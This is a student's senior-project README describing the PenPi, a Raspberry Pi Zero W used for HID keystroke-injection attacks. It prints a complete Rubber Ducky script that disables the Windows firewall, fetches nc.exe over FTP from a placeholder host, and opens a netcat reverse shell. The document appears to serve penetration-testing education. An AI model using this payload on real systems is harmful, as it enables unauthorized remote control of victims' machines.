# CS445Project
I decided to use a physical security device created by myself and a few team members for our senior project in CS. It is called the PenPi, short for Penetration Raspberry Pi, a tool designed to be used by researchers and use by professionals in a penetration testing scenario. In this project, I setup the PenPi device to launch a USB Rubber Ducky script against a Windows 10 Machine in order to compromise it and setup a reverse shell that connected to my "Hacking" system.

Due to my limited time on the project, I did not have much opportunity to do anything other than this attack.

## PenPi
The Penpi device is a Raspberry Pi Zero W that can be used to launch HID emulation attacks as well as a multitude of others. It can be interfaced in many ways, including by app over Bluetooth and wirelessly with SSH, and can launch payloads in many ways as well. I used it for a simple HID attack in which I emulated a keyboard via USB.

## Encoder
The encoder included in the files above is designed to take scripts that are traditionally meant to run in the USB Rubber Ducky from Hak5 and enable their use on the PenPi device

## HID Emuator
This magic part of the tool will take the encoded ducky script uploaded to the PenPi device and send it in HID packets to the target machine. In this way, the device can send keyboard input to the device and force it to execute commands on the command prompt. This is how the script interacts with the victim machine.

## Script
Below is the script that I used on the device for this project:
```
DELAY 10000
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 600
STRING cd %USERPROFILE%
ENTER
DELAY 100
STRING netsh firewall set opmode disable
ENTER
DELAY 2000
STRING echo open [IP] [PORT] > ftp.txt
ENTER
DELAY 100
STRING echo [USERNAME]>> ftp.txt
ENTER
DELAY 100
STRING echo [PASSWORD]>> ftp.txt
ENTER
DELAY 100
STRING echo bin >> ftp.txt
ENTER
DELAY 100
STRING echo get nc.exe >> ftp.txt
ENTER
DELAY 100
STRING echo bye >> ftp.txt
ENTER
DELAY 100
STRING ftp -s:ftp.txt
ENTER
STRING del ftp.txt & exit
ENTER
DELAY 2000
GUI r
DELAY 200
STRING nc.exe [LISTENER IP] [LISTENER PORT] -e cmd.exe -d
ENTER
DELAY 2000
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 600
STRING exit
ENTER
```

## Additional photos and resources
These are available upon request, I do have the PenPi device on hand and can demo the script in person if necessary - please let me know if that will be needed!

### END OF FILE
